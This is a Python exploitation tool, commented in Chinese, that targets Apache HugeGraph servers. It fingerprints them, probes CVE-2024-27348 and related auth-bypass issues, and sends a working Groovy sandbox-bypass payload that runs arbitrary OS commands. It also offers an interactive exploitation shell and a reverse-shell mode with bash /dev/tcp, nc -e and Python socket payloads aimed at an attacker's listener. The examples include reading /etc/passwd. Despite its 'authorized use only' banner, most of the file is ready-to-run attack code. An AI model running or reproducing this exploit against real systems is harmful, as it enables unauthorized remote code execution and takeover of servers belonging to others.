#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apache HugeGraph 综合漏洞检测/利用脚本 v1.0
覆盖 HugeGraph-Server Gremlin RCE / JWT 认证绕过 / 反序列化
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  rce    — 远程命令执行
  shell  — 交互式利用 Shell

CVE 覆盖:
  CVE-2024-27348  — Gremlin Sandbox 绕过 RCE (CVSS 9.8, 未授权, CISA KEV)
  CVE-2024-43441  — 硬编码 JWT Secret 认证绕过 (CVSS 9.8)
  CVE-2024-27349  — Auth 模式 IP 白名单绕过 (CVSS 9.1)
  CVE-2025-26866  — Hessian 反序列化 RCE (CVSS 8.8, 集群模式)
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import json
import urllib.parse
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║   Apache HugeGraph 综合漏洞检测/利用工具 v1.0                   ║
║   Gremlin RCE / JWT Auth Bypass / Hessian RCE | 仅限授权使用  ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
    })
    s.timeout = timeout
    return s


# ===================== Gremlin Payload 构造 =====================

def build_gremlin_payload(command: str, read_output: bool = True) -> str:
    """
    构造 CVE-2024-27348 Gremlin RCE Payload
    1) 通过反射修改 Thread.name 绕过 HugeSecurityManager
    2) 通过反射调用 ProcessBuilder 执行命令
    3) 读取 stdout/stderr 输出

    Java 8 和 Java 11 都需要兼容
    """
    escaped_cmd = command.replace('\\', '\\\\').replace('"', '\\"')
    rk = f'MARK_{randstr(6)}'

    if read_output:
        # 带回显版本: 拿到 Process 对象后读取 InputStream
        groovy = f'''
def cmd = "{escaped_cmd}"
def marker = "{rk}"
Class threadClass = Class.forName("java.lang.Thread")
java.lang.reflect.Field field = threadClass.getDeclaredField("name")
field.setAccessible(true)
field.set(Thread.currentThread(), "V")

Class pbClass = Class.forName("java.lang.ProcessBuilder")
java.lang.reflect.Constructor ctor = pbClass.getConstructor(java.util.List.class)
java.util.List<String> cmds
if (System.getProperty("os.name").toLowerCase().contains("win"))
    cmds = java.util.Arrays.asList("cmd.exe", "/c", cmd)
else
    cmds = java.util.Arrays.asList("bash", "-c", cmd)
Object pb = ctor.newInstance(cmds)
java.lang.reflect.Method start = pbClass.getMethod("start")
Object proc = start.invoke(pb)
java.lang.reflect.Method getInputStream = proc.getClass().getMethod("getInputStream")
java.lang.reflect.Method getErrorStream = proc.getClass().getMethod("getErrorStream")

def readStream(s) {{
    java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(s))
    StringBuilder sb = new StringBuilder()
    String l
    while ((l = r.readLine()) != null) sb.append(l).append("\\n")
    r.close()
    return sb.toString()
}}

String out = readStream(getInputStream.invoke(proc))
String err = readStream(getErrorStream.invoke(proc))
getInputStream.invoke(proc).close()
getErrorStream.invoke(proc).close()
return marker + "\\n" + out + err
'''
    else:
        # Blind 版本: 不读输出
        groovy = f'''
def cmd = "{escaped_cmd}"
Class threadClass = Class.forName("java.lang.Thread")
java.lang.reflect.Field field = threadClass.getDeclaredField("name")
field.setAccessible(true)
field.set(Thread.currentThread(), "V")

Class pbClass = Class.forName("java.lang.ProcessBuilder")
java.lang.reflect.Constructor ctor = pbClass.getConstructor(java.util.List.class)
java.util.List<String> cmds
if (System.getProperty("os.name").toLowerCase().contains("win"))
    cmds = java.util.Arrays.asList("cmd.exe", "/c", cmd)
else
    cmds = java.util.Arrays.asList("bash", "-c", cmd)
Object pb = ctor.newInstance(cmds)
java.lang.reflect.Method start = pbClass.getMethod("start")
start.invoke(pb)
return "{rk}"
'''

    return groovy.strip()


def build_detect_payload() -> str:
    """构造无害检测 Payload"""
    rk = f'HUGEGRAPH_{randstr(6)}'
    groovy = f'''
Class threadClass = Class.forName("java.lang.Thread")
java.lang.reflect.Field field = threadClass.getDeclaredField("name")
field.setAccessible(true)
field.set(Thread.currentThread(), "V")
return "{rk}"
'''
    return groovy.strip()


# ===================== 0. 指纹 / 版本检测 =====================

def detect_hugegraph(url: str, s: requests.Session) -> Tuple[bool, Optional[str], Dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")
    info: Dict = {}

    probes = [
        ('/versions', 'json', ['version', 'hugegraph']),
        ('/', 'html', ['hugegraph', 'HugeGraph']),
        ('/gremlin', 'api', []),  # Gremlin 端点是否存在
        ('/graphs/hugegraph', 'json', ['graph']),
        ('/api', 'html', ['hugegraph']),
    ]

    detected = False
    for path, resp_type, keywords in probes:
        try:
            r = s.get(build_url(url, path), timeout=8, allow_redirects=True)
            text = r.text

            # Gremlin 端点: 返回 200 但可能是报错信息
            if path == '/gremlin' and r.status_code == 200:
                safe_print(f"  {C.GRN}[+] Gremlin 端点存在{C.RST}")
                detected = True
                continue

            for kw in keywords:
                if kw.lower() in text.lower():
                    safe_print(f"  {C.GRN}[+] 确认 HugeGraph — {path} (特征: {kw}){C.RST}")
                    detected = True
                    break
            if detected:
                break
        except Exception:
            continue

    if not detected:
        safe_print(f"  {C.CYN}[-] 未识别 HugeGraph 特征 (将继续检测){C.RST}")
        return False, None, info

    # 版本号提取
    version = None
    try:
        r = s.get(build_url(url, '/versions'), timeout=8)
        try:
            data = r.json()
            info['versions'] = data
            for k, v in data.items():
                if 'version' in str(k).lower() or 'hugegraph' in str(k).lower():
                    if v:
                        version = str(v)
                        safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
                        break
        except json.JSONDecodeError:
            m = re.search(r'"version"\s*:\s*"([^"]+)"', r.text)
            if m:
                version = m.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
    except Exception:
        pass

    return True, version, info


# ===================== 1. CVE-2024-27348 — Gremlin RCE =====================

def check_cve_2024_27348(url: str, s: requests.Session) -> Tuple[bool, str]:
    """
    CVE-2024-27348: Gremlin Sandbox 绕过 RCE
    影响: HugeGraph-Server 1.0.0 ~ 1.2.x (< 1.3.0)
    """
    safe_print(f"\n{C.YLW}[1] CVE-2024-27348: Gremlin Sandbox 绕过 RCE (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: 1.0.0~1.2.x | 未授权 | CISA KEV | 已在野利用{C.RST}")

    gremlin_url = build_url(url, '/gremlin')

    # Step 1: 发送无害检测 Payload (仅 Thread bypass + return marker)
    detect_groovy = build_detect_payload()
    safe_print(f"  {C.CYN}[*] 探测 Gremlin 沙箱绕过...{C.RST}")

    try:
        r = s.post(gremlin_url, json={'gremlin': detect_groovy},
                   headers={'Content-Type': 'application/json'}, timeout=15)

        if r.status_code == 200:
            try:
                data = r.json()
                result = data.get('result', {}).get('data', '')
                if isinstance(result, list) and len(result) > 0:
                    result_str = str(result[0])
                else:
                    result_str = str(result)

                if 'HUGEGRAPH_' in result_str:
                    safe_print(f"  {C.RED}[!] Sandbox 绕破成功! Thread 改名 + 代码执行{C.RST}")
                    safe_print(f"  {C.RED}    返回值: {result_str}{C.RST}")
                    safe_print(f"  {C.RED}[!] CVE-2024-27348 确认存在!{C.RST}")
                    return True, result_str

                # 如果没有回显 marker 但有正常响应
                if '@type' in str(data):
                    safe_print(f"  {C.YLW}[*] Gremlin 响应正常但 marker 未出现{C.RST}")
                    safe_print(f"  {C.YLW}    完整响应: {str(data)[:300]}{C.RST}")

            except json.JSONDecodeError:
                safe_print(f"  {C.CYN}    非 JSON 响应: {r.text[:200]}{C.RST}")

    except Exception as e:
        safe_print(f"  {C.CYN}    请求异常: {e}{C.RST}")

    # Step 2: 尝试无 Thread bypass 的简单检测
    safe_print(f"  {C.CYN}[*] 尝试简单 Gremlin 执行...{C.RST}")
    try:
        simple_groovy = "1+1"
        r = s.post(gremlin_url, json={'gremlin': simple_groovy},
                   headers={'Content-Type': 'application/json'}, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                safe_print(f"  {C.GRN}[+] Gremlin 端点正常响应 (未认证可访问){C.RST}")
            except Exception:
                pass
    except Exception:
        pass

    # Step 3: 发送带命令的 Payload 进行 blind 测试 (echo marker)
    safe_print(f"  {C.CYN}[*] 尝试 blind 命令执行...{C.RST}")
    rk = randstr(6)
    marker = f'BLIND_{rk}'
    blind_groovy = build_gremlin_payload(f'echo {marker}', read_output=True)

    try:
        r = s.post(gremlin_url, json={'gremlin': blind_groovy},
                   headers={'Content-Type': 'application/json'}, timeout=20)

        if r.status_code == 200:
            data = r.json()
            result = data.get('result', {}).get('data', '')
            result_str = str(result)
            if marker in result_str:
                safe_print(f"  {C.RED}[!] 命令执行成功 — 输出中有 marker!{C.RST}")
                safe_print(f"  {C.RED}    输出: {result_str[:500]}{C.RST}")
                return True, result_str
            else:
                safe_print(f"  {C.YLW}    响应无 marker, 但请求正常{C.RST}")
                safe_print(f"  {C.YLW}    响应: {result_str[:300]}{C.RST}")
    except Exception as e:
        safe_print(f"  {C.CYN}    {e}{C.RST}")

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2024-27348 (可能已修复或 Java 版本不兼容){C.RST}")
    return False, ''


# ===================== 2. CVE-2024-43441 — JWT Auth Bypass =====================

def check_cve_2024_43441_jwt(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[2] CVE-2024-43441: 硬编码 JWT Secret 认证绕过 (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: 1.0.0~1.4.x (< 1.5.0) | 绕过身份验证{C.RST}")

    # 尝试访问需要认证的端点
    auth_endpoints = [
        ('/graphs/hugegraph/schema/vertexlabels', 'GET'),
        ('/graphs/hugegraph/graph/vertices', 'GET'),
    ]

    for ep, method in auth_endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 401 or r.status_code == 403:
                safe_print(f"  {C.YLW}[*] 端点需要认证 — {ep} (HTTP {r.status_code}){C.RST}")
                safe_print(f"  {C.YLW}    可尝试硬编码 JWT Secret 签名绕过 (CVE-2024-43441){C.RST}")
                safe_print(f"  {C.YLW}    工具: 使用 HugeGraph 已知 secret 生成 JWT Token{C.RST}")
                return True
            elif r.status_code == 200:
                safe_print(f"  {C.GRN}[+] {ep} 无需认证 — 可以直接访问{C.RST}")
        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未启用认证或端点不可达{C.RST}")
    return False


# ===================== 3. CVE-2024-27349 — IP 白名单绕过 =====================

def check_cve_2024_27349_bypass(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[3] CVE-2024-27349: Auth 模式 IP 白名单绕过 (CVSS 9.1){C.RST}")
    safe_print(f"  {C.CYN}    影响: 1.0.0~1.2.x (< 1.3.0) | 绕过 IP 白名单限制{C.RST}")

    # 尝试多个 Header 伪造 IP
    spoof_headers = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Forwarded-For': '192.168.1.1'},
        {'X-Original-Forwarded-For': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
    ]

    try:
        # 先不带 header 测
        r1 = s.get(build_url(url, '/gremlin'), timeout=8)
        baseline_status = r1.status_code

        for h in spoof_headers:
            try:
                r = s.get(build_url(url, '/gremlin'), headers=h, timeout=8)
                if r.status_code != baseline_status:
                    safe_print(f"  {C.YLW}[*] IP 伪造可能导致不同响应: {h} → HTTP {r.status_code}{C.RST}")
            except Exception:
                continue
    except Exception:
        pass

    safe_print(f"  {C.CYN}[-] 未发现明显的 IP 白名单绕过特征{C.RST}")
    safe_print(f"  {C.CYN}    可通过手工尝试 Header 伪造 /auth 端点{C.RST}")
    return False


# ===================== 4. 信息泄露 =====================

def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[4] 信息泄露 / 配置审计{C.RST}")
    hits = []

    info_endpoints = [
        ('/versions', '版本信息'),
        ('/graphs', '图列表'),
        ('/graphs/hugegraph', 'HugeGraph 图信息'),
        ('/metrics', '指标信息'),
        ('/actuator', 'Spring Boot Actuator'),
        ('/actuator/health', '健康检查'),
        ('/actuator/env', '环境变量'),
        ('/actuator/configprops', '配置属性'),
        ('/swagger-ui.html', 'Swagger UI'),
        ('/v2/api-docs', 'API 文档 v2'),
        ('/v3/api-docs', 'API 文档 v3'),
    ]

    for ep, desc in info_endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 200 and len(r.text) > 10:
                if 'doctype' not in r.text.lower()[:50]:
                    safe_print(f"  {C.YLW}[*] 未授权访问 — {desc} ({ep}, HTTP 200){C.RST}")
                    if 'version' in ep.lower():
                        safe_print(f"  {C.YLW}    内容: {r.text[:300].strip()}{C.RST}")
                    hits.append(f'信息泄露 ({desc})')
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 无明显信息泄露{C.RST}")
    return hits


# ===================== 利用函数 =====================

def exploit_rce_cve_2024_27348(url: str, command: str, s: requests.Session) -> Optional[str]:
    safe_print(f"\n{C.BLD}[CVE-2024-27348] 命令执行: {command}{C.RST}\n")
    gremlin_url = build_url(url, '/gremlin')

    groovy = build_gremlin_payload(command, read_output=True)

    try:
        safe_print(f"  {C.CYN}[*] 发送 Gremlin Payload...{C.RST}")
        r = s.post(gremlin_url, json={'gremlin': groovy},
                   headers={'Content-Type': 'application/json'}, timeout=30)

        safe_print(f"  HTTP {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                result = data.get('result', {}).get('data', '')
                if isinstance(result, list) and len(result) > 0:
                    output = str(result[0])
                else:
                    output = str(result)

                # 提取 marker 后的实际输出
                marker_pattern = r'MARK_\w+\n'
                m = re.search(marker_pattern, output)
                if m:
                    output = output[m.end():]

                if output and output != 'null' and output.strip():
                    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
                    safe_print(f"{C.BLD}命令输出:{C.RST}")
                    safe_print(output[:5000])
                    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
                    return output
                else:
                    safe_print(f"  {C.GRN}[+] 命令已执行 (无回显){C.RST}")
                    return "已执行 (无回显)"

            except json.JSONDecodeError:
                safe_print(f"  响应: {r.text[:500]}")
                return r.text[:2000]

        elif r.status_code == 500:
            safe_print(f"  {C.YLW}[*] HTTP 500 — 可能沙箱已拦截或 Java 版本不兼容{C.RST}")
            safe_print(f"  响应: {r.text[:300]}")

    except Exception as e:
        safe_print(f"  {C.RED}失败: {e}{C.RST}")

    return None


def exploit_reverse_shell(url: str, lhost: str, lport: int,
                          s: requests.Session) -> bool:
    safe_print(f"\n{C.BLD}[CVE-2024-27348] 反弹 Shell → {lhost}:{lport}{C.RST}\n")

    payloads = [
        f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
        f'bash -c "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done"',
        f'nc -e /bin/bash {lhost} {lport}',
        f'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{lhost}\',{lport}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call([\'/bin/bash\',\'-i\'])"',
    ]

    for i, pl in enumerate(payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}/{len(payloads)}{C.RST}")
        exploit_rce_cve_2024_27348(url, pl, s)
        time.sleep(0.5)

    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


# ===================== 交互式 Shell =====================

def interactive_shell(url: str, s: requests.Session):
    safe_print(f"\n{C.GRN}[+] 交互式 HugeGraph Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: {url}{C.RST}")
    safe_print(f"{C.CYN}    漏洞: CVE-2024-27348 (Gremlin Sandbox 绕过 RCE){C.RST}")

    while True:
        try:
            cmd = input(f"{C.RED}HugeGraph[{url}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}exec <cmd>{C.RST}        执行命令 (带回显)
  {C.GRN}blind <cmd>{C.RST}       执行命令 (blind)
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 Shell
  {C.GRN}gremlin <script>{C.RST}  直接发送 Gremlin 脚本
  {C.GRN}check{C.RST}             综合漏洞检测
  {C.GRN}version{C.RST}           显示版本信息
  {C.GRN}endpoints{C.RST}         探测信息泄露端点
  {C.GRN}get <path>{C.RST}        发送 GET 请求
                """)
                continue

            if action == 'exec':
                if not arg:
                    safe_print(f"{C.YLW}用法: exec <command>{C.RST}")
                    continue
                exploit_rce_cve_2024_27348(url, arg, s)
                continue

            if action == 'blind':
                if not arg:
                    safe_print(f"{C.YLW}用法: blind <command>{C.RST}")
                    continue
                groovy = build_gremlin_payload(arg, read_output=False)
                try:
                    r = s.post(build_url(url, '/gremlin'), json={'gremlin': groovy},
                               headers={'Content-Type': 'application/json'}, timeout=20)
                    safe_print(f"HTTP {r.status_code}")
                    if r.status_code == 200:
                        safe_print(f"{C.GRN}[+] 已发送 (盲执行){C.RST}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(url, args_list[0], int(args_list[1]), s)
                continue

            if action == 'gremlin':
                if not arg:
                    safe_print(f"{C.YLW}用法: gremlin <groovy_script>{C.RST}")
                    continue
                try:
                    r = s.post(build_url(url, '/gremlin'), json={'gremlin': arg},
                               headers={'Content-Type': 'application/json'}, timeout=20)
                    safe_print(f"HTTP {r.status_code}")
                    safe_print(r.text[:3000])
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'check':
                run_all_checks(url, s)
                continue

            if action == 'version':
                try:
                    r = s.get(build_url(url, '/versions'), timeout=8)
                    safe_print(r.text[:2000])
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'endpoints':
                eps = ['/versions', '/graphs', '/metrics',
                       '/actuator', '/actuator/health', '/actuator/env',
                       '/swagger-ui.html', '/v2/api-docs']
                for ep in eps:
                    try:
                        r = s.get(build_url(url, ep), timeout=5)
                        if r.status_code == 200 and len(r.text) > 10:
                            safe_print(f"  {C.GRN}[{r.status_code}] {ep} — {len(r.text)}B{C.RST}")
                    except Exception:
                        pass
                continue

            if action == 'get':
                if not arg:
                    safe_print(f"{C.YLW}用法: get <path>{C.RST}")
                    continue
                try:
                    r = s.get(build_url(url, arg), timeout=10)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:2000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")


# ===================== 主流程 =====================

def run_all_checks(url: str, s: requests.Session) -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    is_hg, version, info = detect_hugegraph(url, s)
    if not is_hg:
        safe_print(f"\n{C.RED}未检测到 HugeGraph 服务{C.RST}")
        return all_hits
    if version:
        all_hits.append(f'版本: {version}')

    # 1. CVE-2024-27348
    hit, _ = check_cve_2024_27348(url, s)
    if hit:
        all_hits.append('CVE-2024-27348 Gremlin Sandbox 绕过 RCE (CVSS 9.8)')

    # 2. CVE-2024-43441
    if check_cve_2024_43441_jwt(url, s):
        all_hits.append('CVE-2024-43441 硬编码 JWT Secret 绕过 (CVSS 9.8)')

    # 3. CVE-2024-27349
    check_cve_2024_27349_bypass(url, s)

    # 4. 信息泄露
    info_hits = check_info_disclosure(url, s)
    all_hits.extend(info_hits)

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标 : {url}")
    if version:
        safe_print(f"  版本 : HugeGraph {version}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('27348' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 未授权 RCE! CVSS 9.8 — CISA KEV 收录, 已在野利用{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (可能已修复){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()

    parser = argparse.ArgumentParser(
        description='Apache HugeGraph 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测
  python hugegraph_check.py -u http://192.168.1.100:8080

  # 远程命令执行 (带回显)
  python hugegraph_check.py -u http://target:8080 rce "whoami"
  python hugegraph_check.py -u http://target:8080 rce "cat /etc/passwd"

  # 反弹 Shell
  python hugegraph_check.py -u http://target:8080 rce --reverse --lhost 10.0.0.1 --lport 4444

  # 交互式 Shell
  python hugegraph_check.py -u http://target:8080 shell

  # 超时 / 代理
  python hugegraph_check.py -u http://target:8080 --timeout 15 --proxy http://127.0.0.1:8080
        ''',
    )
    parser.add_argument('-u', '--url', required=True,
                        help='目标 URL (例: http://target:8080)')
    parser.add_argument('--timeout', type=int, default=10, help='超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')
    rce_p = sub.add_parser('rce', help='远程命令执行 (CVE-2024-27348)')
    rce_p.add_argument('command', nargs='?', help='要执行的命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 Shell 监听 IP')
    rce_p.add_argument('--lport', type=int, help='反弹 Shell 监听端口')
    sub.add_parser('shell', help='交互式利用 Shell')

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)
    if args.proxy:
        s.proxies = {'http': args.proxy, 'https': args.proxy}

    if args.mode == 'check':
        run_all_checks(url, s)
    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}反弹 Shell 需要 --lhost 和 --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(url, args.lhost, args.lport, s)
        elif args.command:
            exploit_rce_cve_2024_27348(url, args.command, s)
        else:
            safe_print(f"{C.RED}需要指定命令或 --reverse{C.RST}")
    elif args.mode == 'shell':
        interactive_shell(url, s)

    safe_print("")


if __name__ == '__main__':
    main()
